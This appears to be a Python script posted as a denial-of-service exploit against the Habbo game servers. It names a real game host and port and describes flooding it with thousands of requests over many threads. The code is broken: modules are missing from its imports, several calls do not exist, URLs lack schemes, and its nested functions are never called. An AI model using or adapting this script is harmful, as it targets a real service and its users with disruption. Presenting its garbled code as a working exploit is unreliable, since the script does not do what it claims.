## Exploit Title: Habbo Denial Of Service (DoS) Vulnerability
## Exploit Author: g0d
## Vendor Homepage: https://www.habbo.es/
## Exploit Version: 1.0

import requests
import sys
import argparse






print ('''
_______________       .___                                .___             
 /  _____/\   _  \    __| _/ ________ ___________  ____   __| _/____  ___.__.
/   \  ___/  /_\  \  / __ |  \___   // __ \_  __ \/  _ \ / __ |\__  \<   |  |
\    \_\  \  \_/   \/ /_/ |   /    /\  ___/|  | \(  <_> ) /_/ | / __ \\___  |
 \______  /\_____  /\____ |  /_____ \\___  >__|   \____/\____ |(____  / ____|
        \/       \/      \/        \/    \/                  \/     \/\/     
>--------------------------------------------->''')


## Create argparse arguments with exploit, port, threads
parser = argparse.ArgumentParser(description='Habbo DoS Exploit')
parser.add_argument('-t', '--target', help='Exploit URL', required=True)
parser.add_argument('-p', '--port', help='Exploit Port', required=True)
parser.add_argument('-th', '--threads', help='Exploit Threads', required=True)

args = parser.parse_args()

target_url = args.target
port_port = args.port
theads_threads = args.threads


## Connect with habbo.es api to send request to the game flash client
def connect():
    connect = requests.get('https://www.habbo.es/gamedata/external_variables/1')
    connect = requests.get('https://www.habbo.es/gamedata/external_flash_texts/1')
    connect = requests.get('https://www.habbo.es/gamedata/override/1')
    connect = requests.get('game-es.habbo.com:30000')
    connect.close()
    
    ## create a loop to send request to game-es.habbo.com:30000
    def loop():
        while True:
            requests.get('game-es.habbo.com:30000')
            if requests.get('game-es.habbo.com:30000').status_code == 200:
                print('Habbo DoS Attack Started')
                
                ## Create a function to send GET request to game-es.habbo.com:30000
                def GET():
                    GET = send.request('GET / HTTP/1.1\r\nHost: game-es.habbo.com:30000\r\n\r\n')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    r = s.connect((target_url, port_port))
                    r = requests.sendall('GET / HTTP/1.1\r\nHost: game-es.habbo.com:30000\r\n\r\n')
                    r = request_persecond(2500)
                    r = threading.threading(1500)
                    
                
                
                ## Create a function to send 2500 request per second with 1500 threads
                def request_persecond():
                    request_persecond = requests.get('game-es.habbo.com:30000')
                    request_persecond.threading(1500)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_url, port_port))
                    s.request = ('GET / HTTP/1.1\r\nHost: game-es.habbo.com:30000\r\n\r\n')
                    s.send(request_persecond)
                    s.close()
                    
                
                
    




